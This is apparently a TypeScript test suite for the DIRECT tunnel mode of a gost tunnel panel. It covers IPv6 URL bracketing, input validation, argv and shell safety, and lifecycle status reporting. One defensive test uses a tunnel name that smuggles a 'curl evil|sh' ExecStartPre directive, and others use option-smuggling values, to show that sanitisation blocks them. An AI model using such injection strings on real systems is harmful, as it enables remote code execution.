/**
 * DIRECT method coverage (TASK-31).
 *
 * The defect: `bindAddr` and `targetHost` were plain `z.string()`, and both are
 * interpolated straight into a gost URL:
 *
 *     tcp://<bindAddr>:<listenPort>/<targetHost>:<targetPort>
 *
 * An IPv6 literal therefore produced an ambiguous, unparseable authority:
 *
 *     bindAddr "::1"    -> tcp://::1:8080/10.0.0.5:80
 *     targetHost "::1"  -> tcp://:8080/::1:80
 *
 * RFC 3986 requires brackets around an IPv6 literal in a URI authority, and
 * without them the colons are indistinguishable from the port separator. The
 * same gap let a "/" or "?" in targetHost silently corrupt the URL path or
 * start a query, and a full "tcp://host" in bindAddr produced a doubled scheme.
 *
 * There is no argv-splitting or shell injection here -- the builder returns an
 * array and every runner uses spawn/execFile with no `shell: true`. That is
 * asserted too, so the safety claim is tested rather than assumed.
 */
import { strict as assert } from "node:assert";
import * as fs from "node:fs";
import os from "node:os";
import path from "node:path";

import {
  buildDirectCommand,
  DIRECT_BINARY,
} from "../packages/tunnel-core/src/config/direct.ts";
import { DirectConfigSchema, TunnelConfigSchema, TunnelMethod, type DirectConfig } from "../packages/types/src/index.ts";
import { sanitizeForDiagnostics } from "../packages/tunnel-core/src/diagnostics.ts";
import { buildUnit, sanitizeUnitText } from "../packages/tunnel-core/src/process.ts";
import {
  TunnelEngine,
  type ProcessHandle,
  type ProcessSpec,
  type TunnelDeploySpec,
} from "../packages/tunnel-core/src/engine.ts";

let pass = 0;
/**
 * A fixed, schema-valid DIRECT config used wherever a test needs a baseline to
 * patch. Module scope so the builder-message checks and the union-path checks
 * share one fixture instead of two that could drift apart.
 */
const RAW: DirectConfig = {
  protocol: "tcp",
  bindAddr: "0.0.0.0",
  listenPort: 8080,
  targetHost: "127.0.0.1",
  targetPort: 80,
};

const failures: string[] = [];
const ok = (n: string): void => {
  pass += 1;
  console.log(`  ok   ${n}`);
};
const bad = (n: string, d: string): void => {
  failures.push(n);
  console.log(`  FAIL ${n}\n       ${d}`);
};

const mk = (o: Record<string, unknown> = {}): DirectConfig =>
  DirectConfigSchema.parse({
    protocol: "tcp",
    bindAddr: "0.0.0.0",
    listenPort: 8080,
    targetHost: "10.0.0.5",
    targetPort: 80,
    ...o,
  });

const url = (cfg: DirectConfig): string => buildDirectCommand(cfg)[2];

async function main(): Promise<void> {
  try {
    // =====================================================================
    // 1. IPv6 literals are bracketed (RFC 3986).
    // =====================================================================
    {
      const cases: Array<[string, DirectConfig, string]> = [
        ["bindAddr ::1", mk({ bindAddr: "::1" }), "tcp://[::1]:8080/10.0.0.5:80"],
        // `::` is the IPv6 "any" wildcard, the counterpart of 0.0.0.0, so it
        // maps to an EMPTY authority exactly as 0.0.0.0 does.
        ["bindAddr :: (any)", mk({ bindAddr: "::" }), "tcp://:8080/10.0.0.5:80"],
        ["bindAddr fe80::1%eth0", mk({ bindAddr: "fe80::1%eth0" }), "tcp://[fe80::1%eth0]:8080/10.0.0.5:80"],
        ["targetHost ::1", mk({ targetHost: "::1" }), "tcp://:8080/[::1]:80"],
        ["targetHost 2001:db8::1", mk({ targetHost: "2001:db8::1" }), "tcp://:8080/[2001:db8::1]:80"],
        ["both IPv6", mk({ bindAddr: "::1", targetHost: "2001:db8::2" }), "tcp://[::1]:8080/[2001:db8::2]:80"],
        // A `::` TARGET is not a wildcard -- it is a real address, so it is bracketed.
        ["bindAddr :: with target ::1", mk({ bindAddr: "::", targetHost: "::1" }), "tcp://:8080/[::1]:80"],
        ["targetHost :: (any as a target)", mk({ targetHost: "::" }), "tcp://:8080/[::]:80"],
      ];
      let wrong = 0;
      for (const [label, cfg, want] of cases) {
        const got = url(cfg);
        if (got !== want) {
          wrong += 1;
          bad(`${label} is bracketed`, `got ${got}, want ${want}`);
        }
      }
      if (wrong === 0) ok(`all ${cases.length} IPv6 cases are bracketed per RFC 3986`);

      // The SCHEMA takes BARE literals only; brackets are the builder's job.
      // Asserted here because an operator pasting "[::1]" from a config file
      // should be told so, not silently have them double-bracketed.
      const bracketed = DirectConfigSchema.safeParse({ ...mk(), bindAddr: "[::1]" });
      if (!bracketed.success) ok("the schema rejects an already-bracketed IPv6 literal");
      else bad("the schema rejects bracketed input", "it parsed");

      // Bracketed input is refused by the BUILDER too, and that is the right
      // outcome: brackets are this layer's output, not its input. Accepting
      // them would mean the validator and the builder disagree about the
      // contract, and a caller that bypassed the schema could produce "[[::1]]".
      let bracketedThrow = "";
      try {
        buildDirectCommand({ ...mk(), bindAddr: "[::1]" } as DirectConfig);
      } catch (e) {
        bracketedThrow = (e as Error).message;
      }
      if (bracketedThrow !== "") ok("the builder also refuses an already-bracketed literal");
      else bad("the builder refuses bracketed input", "it returned a URL");
      if (/not a hostname, IPv4 or IPv6 literal/.test(bracketedThrow)) {
        ok("the refusal explains that the address form is wrong");
      } else {
        bad("the refusal explains the address form", bracketedThrow);
      }
    }

    // =====================================================================
    // 2. IPv4 and hostnames are unchanged -- bracketing must not regress them.
    // =====================================================================
    {
      const cases: Array<[string, DirectConfig, string]> = [
        ["default wildcard", mk(), "tcp://:8080/10.0.0.5:80"],
        ["loopback v4", mk({ bindAddr: "127.0.0.1" }), "tcp://127.0.0.1:8080/10.0.0.5:80"],
        ["explicit 0.0.0.0", mk({ bindAddr: "0.0.0.0" }), "tcp://:8080/10.0.0.5:80"],
        ["private v4", mk({ bindAddr: "192.168.1.10" }), "tcp://192.168.1.10:8080/10.0.0.5:80"],
        ["hostname", mk({ bindAddr: "eth0.example.com" }), "tcp://eth0.example.com:8080/10.0.0.5:80"],
        ["target hostname", mk({ targetHost: "backend.internal" }), "tcp://:8080/backend.internal:80"],
      ];
      let wrong = 0;
      for (const [label, cfg, want] of cases) {
        const got = url(cfg);
        if (got !== want) {
          wrong += 1;
          bad(`${label} is unchanged`, `got ${got}, want ${want}`);
        }
      }
      if (wrong === 0) ok(`all ${cases.length} IPv4/hostname cases are unchanged`);
    }

    // =====================================================================
    // 3. Values that would corrupt the URL are rejected, not silently emitted.
    // =====================================================================
    {
      const rejects: Array<[string, Record<string, unknown>]> = [
        ["bindAddr with a slash", { bindAddr: "1.2.3.4/5" }],
        ["bindAddr with a space", { bindAddr: "1.2.3.4 -x" }],
        ["bindAddr with a newline", { bindAddr: "1.2.3.4\n-oX=1" }],
        ["bindAddr with a scheme", { bindAddr: "tcp://1.2.3.4" }],
        ["bindAddr empty", { bindAddr: "" }],
        ["bindAddr whitespace", { bindAddr: "   " }],
        ["targetHost with a slash", { targetHost: "a/b" }],
        ["targetHost with a query", { targetHost: "a?b" }],
        ["targetHost with a fragment", { targetHost: "a#b" }],
        ["targetHost with a space", { targetHost: "a b" }],
        ["targetHost with a newline", { targetHost: "a\nb" }],
        ["targetHost with a scheme", { targetHost: "tcp://1.2.3.4" }],
        ["targetHost empty", { targetHost: "" }],
        ["targetHost whitespace", { targetHost: "  " }],
        ["targetHost with a userinfo @", { targetHost: "user@host" }],
        ["protocol sctp", { protocol: "sctp" }],
        ["protocol uppercase", { protocol: "TCP" }],
      ];
      let n = 0;
      for (const [label, patch] of rejects) {
        if (!DirectConfigSchema.safeParse({ ...mk(), ...patch }).success) n += 1;
        else bad(`the DIRECT schema rejects ${label}`, "it parsed");
      }
      if (n === rejects.length) ok(`the DIRECT schema rejects all ${rejects.length} URL-corrupting values`);

      // And the BUILDER refuses them too, for callers that bypass the schema.
      let builderRefused = 0;
      let total = 0;
      for (const [, patch] of rejects) {
        if ("protocol" in patch) continue;
        total += 1;
        try {
          buildDirectCommand({ ...mk(), ...patch } as DirectConfig);
        } catch {
          builderRefused += 1;
        }
      }
      if (builderRefused === total) ok(`the builder independently refuses all ${total} hostile values`);
      else bad("the builder independently refuses hostile values", `${builderRefused}/${total} refused`);

      // The delimiter check and the final hostname check BOTH refuse these
      // inputs, so "it throws" cannot tell them apart -- the specific MESSAGE
      // is what distinguishes them, and it is what the operator reads. Without
      // the dedicated check, "targetHost must not contain a URL delimiter" would
      // never be emitted and the operator would get a generic "not a hostname".
      // Builder-layer message. Deliberately NOT via mk(): mk() parses through
      // the schema, so an earlier version of this asserted schema wording
      // against builder output and failed for the wrong reason. The two layers
      // are validated independently, at their own boundaries.
      const builderMsg = (patch: Record<string, unknown>): string => {
        try {
          buildDirectCommand({ ...RAW, ...patch } as DirectConfig);
          return "<no error>";
        } catch (e) {
          return (e as Error).message;
        }
      };
      // Schema-layer message.
      const schemaMsg = (patch: Record<string, unknown>): string => {
        const r = DirectConfigSchema.safeParse({ ...RAW, ...patch });
        return r.success ? "<no error>" : r.error.issues.map((i) => i.message).join("; ");
      };
      const delimCases: Array<[string, Record<string, unknown>, RegExp]> = [
        ["targetHost a/b", { targetHost: "a/b" }, /URL delimiter/],
        ["targetHost a?b", { targetHost: "a?b" }, /URL delimiter/],
        ["targetHost a#b", { targetHost: "a#b" }, /URL delimiter/],
        ["bindAddr a/b", { bindAddr: "1.2.3.4/5" }, /URL delimiter/],
      ];
      let msgWrong = 0;
      for (const [label, patch, want] of delimCases) {
        const m = builderMsg(patch);
        if (!want.test(m)) {
          msgWrong += 1;
          bad(`${label} reports a URL-delimiter error`, m);
        }
      }
      if (msgWrong === 0) ok(`all ${delimCases.length} delimiter cases name the delimiter specifically`);

      // A plain invalid hostname gets the generic message, not the delimiter one.
      const generic = builderMsg({ targetHost: "not_a_host!" });
      if (/not a hostname, IPv4 or IPv6 literal/.test(generic) && !/URL delimiter/.test(generic)) {
        ok("a malformed hostname gets the generic message, not a delimiter one");
      } else {
        bad("a malformed hostname gets the generic message", generic);
      }

      // A scheme gets its own message, because "do not include a scheme" is
      // the actionable advice; "not a hostname" would not tell the operator
      // what to do.
      const scheme = builderMsg({ targetHost: "tcp://1.2.3.4" });
      if (/do not include a scheme/.test(scheme)) ok("the builder names the scheme problem specifically");
      else bad("the builder names the scheme problem", scheme);
      if (/without a scheme/.test(schemaMsg({ targetHost: "tcp://1.2.3.4" }))) {
        ok("the schema names the scheme problem specifically");
      } else {
        bad("the schema names the scheme problem", schemaMsg({ targetHost: "tcp://1.2.3.4" }));
      }

      const dash = builderMsg({ bindAddr: "-x" });
      if (/parsed as an option/.test(dash)) ok("a leading dash gets the option-specific message");
      else bad("a leading dash gets the option message", dash);
    }

    // =====================================================================
    // 4. Port semantics.
    // =====================================================================
    {
      const rejects: Array<[string, Record<string, unknown>]> = [
        ["listenPort 0", { listenPort: 0 }],
        ["listenPort 65536", { listenPort: 65536 }],
        ["listenPort non-integer", { listenPort: 80.5 }],
        ["listenPort negative", { listenPort: -1 }],
        ["listenPort as string", { listenPort: "8080" }],
        ["targetPort 0", { targetPort: 0 }],
        ["targetPort 65536", { targetPort: 65536 }],
        ["targetPort non-integer", { targetPort: 80.5 }],
      ];
      let n = 0;
      for (const [label, patch] of rejects) {
        if (!DirectConfigSchema.safeParse({ ...mk(), ...patch }).success) n += 1;
        else bad(`the DIRECT schema rejects ${label}`, "it parsed");
      }
      if (n === rejects.length) ok(`the DIRECT schema rejects all ${rejects.length} invalid ports`);

      // Boundaries that must be accepted, including privileged ports -- the
      // panel runs as a non-root user, so binding <1024 needs capabilities, and
      // refusing it at the schema would be a UX regression. The real constraint
      // is the PREFLIGHT, not validation.
      for (const [label, patch] of [
        ["listenPort 1", { listenPort: 1 }],
        ["listenPort 65535", { listenPort: 65535 }],
        ["targetPort 1", { targetPort: 1 }],
        ["targetPort 65535", { targetPort: 65535 }],
      ] as Array<[string, Record<string, unknown>]>) {
        const cfg = DirectConfigSchema.safeParse({ ...mk(), ...patch });
        if (cfg.success) {
          const u = url(cfg.data as DirectConfig);
          if (!u.includes("undefined") && !u.includes("NaN")) {
            ok(`${label} produces a well-formed URL (${u})`);
          } else {
            bad(`${label} produces a well-formed URL`, u);
          }
        } else {
          bad(`${label} is accepted`, "the schema rejected a valid boundary value");
        }
      }
    }

    // =====================================================================
    // 5. Command shape: leading program token, used exactly once.
    // =====================================================================
    {
      const argv = buildDirectCommand(mk());
      if (argv[0] === DIRECT_BINARY) ok(`the command leads with the program token (${argv[0]})`);
      else bad("the command leads with the program token", String(argv[0]));
      if (argv.filter((a) => a === DIRECT_BINARY).length === 1) ok("the program token appears exactly once");
      else bad("the program token appears exactly once", "duplicated");
      if (argv[1] === "-L") ok("-L is the second token");
      else bad("-L is the second token", String(argv[1]));
      // Every token after the program must not itself look like a flag, which
      // is what "no argv smuggling" means for an array-returning builder.
      const smuggled = argv.slice(1).filter((t) => /^-[A-Za-z]/.test(t) && t !== "-L");
      if (smuggled.length === 0) ok("no token after the program is a smuggled flag");
      else bad("no smuggled flag", JSON.stringify(smuggled));
    }

    // =====================================================================
    // 6. Determinism.
    // =====================================================================
    {
      const a = JSON.stringify(buildDirectCommand(mk({ bindAddr: "::1", targetHost: "2001:db8::1" })));
      const b = JSON.stringify(buildDirectCommand(mk({ bindAddr: "::1", targetHost: "2001:db8::1" })));
      if (a === b) ok("DIRECT command generation is deterministic");
      else bad("DIRECT command generation is deterministic", "two calls differed");
    }

    // =====================================================================
    // 7. No shell anywhere on this path, and no credential exposure.
    // =====================================================================
    {
      const runner = await import("node:fs").then((fs) =>
        fs.readFileSync(
          "E:/codes/Projects/Xistance-Tunnel/xistance-panel/packages/tunnel-core/src/runner.ts",
          "utf8",
        ),
      );
      if (!/shell:\s*true/.test(runner)) ok("the runner never enables shell:true");
      else bad("the runner never enables shell:true", "found it");
      if (/spawn\(argv\[0\], argv\.slice\(1\)/.test(runner)) ok("spawn is called with an argv array, not a shell string");
      else bad("spawn uses an argv array", "not found");

      // A DIRECT config carries no credential, but the diagnostic contract still
      // applies to the command line it produces.
      const argv = buildDirectCommand(mk({ bindAddr: "::1" }));
      const unit = buildUnit({
        id: "xt-1",
        name: "direct",
        command: ["/usr/local/bin/gost", ...argv.slice(1)],
        dataDir: "/var/lib/xistance",
        unitName: "xt-1",
        env: {},
        autorestart: true,
      });
      const execLine = unit.split("\n").find((l) => l.startsWith("ExecStart")) ?? "";
      // The URL contains ':' and '/', which shellQuote must carry through
      // inside single quotes without splitting the token.
      if (execLine === "ExecStart='/usr/local/bin/gost' '-L' 'tcp://[::1]:8080/10.0.0.5:80'") {
        ok("the systemd ExecStart quotes the full URL as one token");
      } else {
        bad("the systemd ExecStart quotes the full URL as one token", execLine);
      }
      if (!/ExecStart=.*\s-o/.test(execLine.replace(/'-L'/g, ""))) {
        ok("no smuggled option reaches the unit file");
      } else {
        bad("no smuggled option reaches the unit file", execLine);
      }

      // Diagnostics keep the shape useful while not leaking a secret.
      const dumped = sanitizeForDiagnostics(`gost direct failed: ${JSON.stringify(argv)}`);
      if (dumped.includes("gost")) ok("the diagnostic still names gost");
      else bad("the diagnostic still names gost", dumped);
    }

    // =====================================================================
    // 8. A tunnel name cannot inject a systemd directive.
    // =====================================================================
    {
      const nasty = "evil\nExecStartPre=/bin/sh -c 'curl evil|sh'\n[Service]";
      const clean = sanitizeUnitText(nasty);
      if (!clean.includes("\n")) ok("a direct tunnel name cannot inject a newline");
      else bad("a direct tunnel name cannot inject a newline", JSON.stringify(clean));
      const unit = buildUnit({
        id: "xt-1",
        name: nasty,
        command: ["/usr/local/bin/gost", "-L", "tcp://:80/10.0.0.5:80"],
        dataDir: "/var/lib/xistance",
        unitName: "xt-1",
        env: {},
        autorestart: true,
      });
      const execs = unit.split("\n").filter((l) => l.startsWith("ExecStart"));
      if (execs.length === 1) ok("the injected text produces no second ExecStart directive");
      else bad("no second ExecStart directive", `${execs.length} found`);
    }


    // =====================================================================
    // 9. Lifecycle: a DIRECT tunnel is never reported running when it is not.
    //
    //    Driven through the REAL engine with a scripted handle, so the planner,
    //    deploy, status cache and stop path are all exercised. The handle is a
    //    double, but the code under test is the engine's own.
    // =====================================================================
    {
      class Handle implements ProcessHandle {
        starts = 0;
        stops = 0;
        running = false;
        constructor(readonly spec: ProcessSpec) {}
        async start(): Promise<void> {
          this.starts += 1;
          this.running = true;
        }
        async stop(): Promise<void> {
          this.stops += 1;
          this.running = false;
        }
        async restart(): Promise<void> {
          this.running = true;
        }
        async isRunning(): Promise<boolean> {
          return this.running;
        }
        async pid(): Promise<number | null> {
          return this.running ? 4242 : null;
        }
        async ioCounters() {
          return null;
        }
        recentLines(): string[] {
          return [];
        }
        async dispose(): Promise<void> {
          this.running = false;
        }
      }

      const dataDir = fs.mkdtempSync(path.join(os.tmpdir(), "xt-direct-"));
      // The preflight (TASK-28) really runs and really requires an executable
      // `gost`. It is NOT bypassed here -- a stub file on PATH satisfies it, so
      // the deploy exercises the same binary-resolution path production uses.
      // (On POSIX this also proves the preflight's -f/-x check accepts a real
      // executable; the handle itself is a double, so gost is never run.)
      const binDir = path.join(dataDir, "bin");
      fs.mkdirSync(binDir, { recursive: true });
      fs.writeFileSync(path.join(binDir, "gost"), "#!/bin/sh\nexit 0\n", { mode: 0o755 });
      if (process.platform === "win32") fs.chmodSync(path.join(binDir, "gost"), 0o755);

      const handles: Handle[] = [];
      // Controllable clock: the caches' TTL is the thing under test here, and
      // sleeping 3 real seconds per assertion is not a usable gate.
      const clock = { value: Date.now(), get now() { return this.value; }, set now(v: number) { this.value = v; } };
      const engine = new TunnelEngine({
        dataDir,
        localBinDir: binDir,
        clock: { now: () => clock.value } as never,
        forceNodeFallback: true,
        forwarderRunner: { prefix: ["node"], script: "forwarder.mjs" },
        createProcessHandle: async (spec) => {
          const h = new Handle(spec);
          handles.push(h);
          return h;
        },
      });

      const spec: TunnelDeploySpec = {
        id: "direct-1",
        name: "direct-tunnel",
        method: "DIRECT",
        config: { method: "DIRECT", direct: mk({ listenPort: 8080 }) },
        // The node shape the engine actually reads: `id` (used as the ctx
        // name) plus `isLocal`, so ctxFor builds a LocalRunner and never
        // attempts SSH. Field names that do not exist on the real endpoint --
        // e.g. `port`/`auth`/`type` here -- are silently ignored, which is how a
        // fixture can be wrong and still appear to work until ctxFor trips.
        clientNode: { id: "local", host: "127.0.0.1", isLocal: true } as never,
      } as unknown as TunnelDeploySpec;

      // The planner must emit exactly one gost process for DIRECT.
      await engine.deploy(spec);
      if (handles.length === 1) ok("a DIRECT deploy plans exactly one process");
      else bad("a DIRECT deploy plans one process", `${handles.length} planned`);

      const cmd = handles[0]?.spec.command ?? [];
      if (cmd[0].endsWith("gost")) ok(`the process uses the resolved gost path (${cmd[0]})`);
      else bad("the process uses the resolved gost path", cmd[0] ?? "none");
      if (cmd[1] === "-L") ok("the resolved command keeps -L as the first argument");
      else bad("the resolved command keeps -L", cmd[1] ?? "none");
      if (!cmd.includes("gost")) ok("the leading gost token is replaced, not duplicated");
      else bad("the leading gost token is replaced", JSON.stringify(cmd));

      if ((await engine.status(spec.id)) === "running") ok("a live DIRECT process reports running");
      else bad("a live DIRECT process reports running", String(await engine.status(spec.id)));

      // Stop it, then confirm the status flips -- and that a CACHED running
      // does not survive, which is the specific way a stopped tunnel gets
      // reported as running.
      await engine.stop(spec.id);
      if ((await engine.status(spec.id)) === "stopped") ok("a stopped DIRECT tunnel reports stopped");
      else bad("a stopped DIRECT tunnel reports stopped", String(await engine.status(spec.id)));
      if (handles[0]?.stops === 1) ok("stop() issued exactly one stop to the process");
      else bad("stop() issued one stop", String(handles[0]?.stops));

      // A repeated status read must not resurrect the old value.
      if ((await engine.status(spec.id)) === "stopped") ok("a repeated status read stays stopped");
      else bad("a repeated status read stays stopped", String(await engine.status(spec.id)));

      // A process that dies on its OWN must not keep reporting running.
      //
      // This is the acceptance criterion "a stopped or failed direct tunnel is
      // never reported as running", and it is genuinely subtle: status() and
      // the per-process running answer are both memoised, so a process that
      // dies between polls is reported `running` until the TTL expires. The
      // clock is injected, so the window can be crossed deterministically
      // instead of sleeping.
      await engine.deploy(spec);
      if ((await engine.status(spec.id)) === "running") ok("the redeployed DIRECT tunnel reports running again");
      else bad("the redeployed tunnel reports running", String(await engine.status(spec.id)));

      // The re-deploy created a NEW handle; the engine tracks the latest one.
      // An earlier version killed handles[0], which the engine had already
      // disposed on redeploy -- so the tracked process stayed alive and the
      // status correctly read "running". The test was wrong, not the engine.
      const live = handles[handles.length - 1];
      if (handles.length !== 2) bad("the redeploy created a second handle", `${handles.length} handles`);
      else ok("the redeploy created a distinct handle for the new runtime");
      if (live) live.running = false;

      // Prime BOTH caches with a `true`, then kill the process. The status memo
      // is warm, and -- this is the point -- so is the per-process running
      // entry. Whether the engine refreshes that entry decides the outcome:
      //   * re-probed  -> stopped
      //   * memoised   -> running, and it stays running on every later poll
      //                   because the recompute keeps re-seeding the same
      //                   stale `true`, so no TTL can ever clear it.
      // Prime the PROCESS cache with a `true` while the process is alive.
      // The status memo (TTL 1.5s) and the process cache (TTL 3s) have
      // different lifetimes, so advancing 2s makes the memo COLD while the
      // process entry stays WARM -- that is the only window in which the two
      // implementations differ.
      let probes = 0;
      if (live) {
        const orig = live.isRunning.bind(live);
        live.isRunning = async () => {
          probes += 1;
          return orig();
        };
      }
      clock.value += 2_000; // status memo expires; process entry does not
      // The process was already killed above, so the honest priming answer is
      // "stopped" -- and it MUST be, because a negative answer is what gets
      // memoised. An implementation that memoisED positives instead would
      // return a stale "running" here, which is exactly the defect mutant H
      // reintroduces.
      const primed = await engine.status(spec.id);
      if (primed === "stopped") ok("the priming read reflects the already-dead process");
      else bad("the priming read reflects the already-dead process", String(primed));
      if (probes >= 1) ok("the priming read probed the process instead of trusting a memo");
      else bad("the priming read probed the process", `probes=${probes}`);

      // Cross the process entry's TTL too, so a memoise-all implementation
      // would also have expired it. A "re-probe positives" implementation
      // notices the death immediately.
      clock.value += 10_000;
      const afterTtl = await engine.status(spec.id);
      if (afterTtl === "stopped") ok("once the memo expires, the status reflects the dead process");
      else bad("the status reflects the dead process after the TTL", String(afterTtl));
      if (probes >= 1) ok("the status read re-probed isRunning() rather than trusting a stale `true`");
      else bad("the status read re-probes isRunning()", `probes=${probes}`);

      // And it must stay that way on a repeated read.
      if ((await engine.status(spec.id)) === "stopped") ok("a dead DIRECT process stays stopped on re-read");
      else bad("a dead DIRECT process stays stopped", String(await engine.status(spec.id)));

      // Removing the tunnel must also clear it.
      await engine.remove(spec.id);
      if ((await engine.status(spec.id)) === "stopped") ok("a removed DIRECT tunnel reports stopped");
      else bad("a removed DIRECT tunnel reports stopped", String(await engine.status(spec.id)));

      fs.rmSync(dataDir, { recursive: true, force: true });
    }

  // ---- the real API path: TunnelConfigSchema --------------------------------
  // DirectConfigSchema is only ever reached through the discriminated union, so
  // a validator exercised directly but bypassed by the API is not really
  // covered. This goes through TunnelConfigSchema exactly as the create route
  // does.
  {
    const viaUnion = (patch: Record<string, unknown>): string => {
      const r = TunnelConfigSchema.safeParse({
        method: TunnelMethod.DIRECT,
        direct: { ...RAW, ...patch },
      });
      return r.success ? "<no error>" : r.error.issues.map((i) => i.message).join("; ");
    };
    if (viaUnion({}) === "<no error>") ok("a well-formed DIRECT tunnel validates through TunnelConfigSchema");
    else bad("a well-formed DIRECT tunnel validates", viaUnion({}));

    // Each refine must be observable THROUGH the union. These assert the exact
    // message, because two different refines can both reject a value and only
    // the message distinguishes them.
    const unionMsg: Array<[string, Record<string, unknown>, RegExp]> = [
      ["a URL delimiter", { targetHost: "a/b" }, /URL delimiter/],
      ["a scheme", { targetHost: "tcp://1.2.3.4" }, /without a scheme/],
      ["a leading dash", { bindAddr: "-x" }, /must not start with/],
      ["whitespace", { targetHost: "a b" }, /whitespace or control characters/],
      ["a malformed hostname", { targetHost: "not_a_host!" }, /hostname, IPv4 or IPv6/],
    ];
    let wrong = 0;
    for (const [label, patch, want] of unionMsg) {
      const m = viaUnion(patch);
      if (!want.test(m)) {
        wrong += 1;
        bad(`through the union, ${label} is named specifically`, m);
      }
    }
    if (wrong === 0) ok(`all ${unionMsg.length} DIRECT refines are observable through TunnelConfigSchema`);

    // The parsed output is what the builder then consumes, defaults included --
    // otherwise a default like 0.0.0.0 never reaches production.
    const parsed = TunnelConfigSchema.parse({
      method: TunnelMethod.DIRECT,
      direct: { listenPort: 8080, targetHost: "10.0.0.5", targetPort: 80 },
    });
    const cfg = (parsed as { direct: DirectConfig }).direct;
    if (cfg.bindAddr === "0.0.0.0" && cfg.protocol === "tcp") ok("the union applies the DIRECT defaults an omitted bindAddr needs");
    else bad("the union applies the DIRECT defaults", JSON.stringify(cfg));
    if (buildDirectCommand(cfg)[2] === "tcp://:8080/10.0.0.5:80") ok("the union-parsed config builds the expected command");
    else bad("the union-parsed config builds the expected command", buildDirectCommand(cfg)[2]);
  }

    console.log(`\n--- ${pass} passed, ${failures.length} failed ---`);
    if (failures.length > 0) process.exitCode = 1;
  } finally {
    /* nothing to clean */
  }
}

void main();
assert.ok(true);
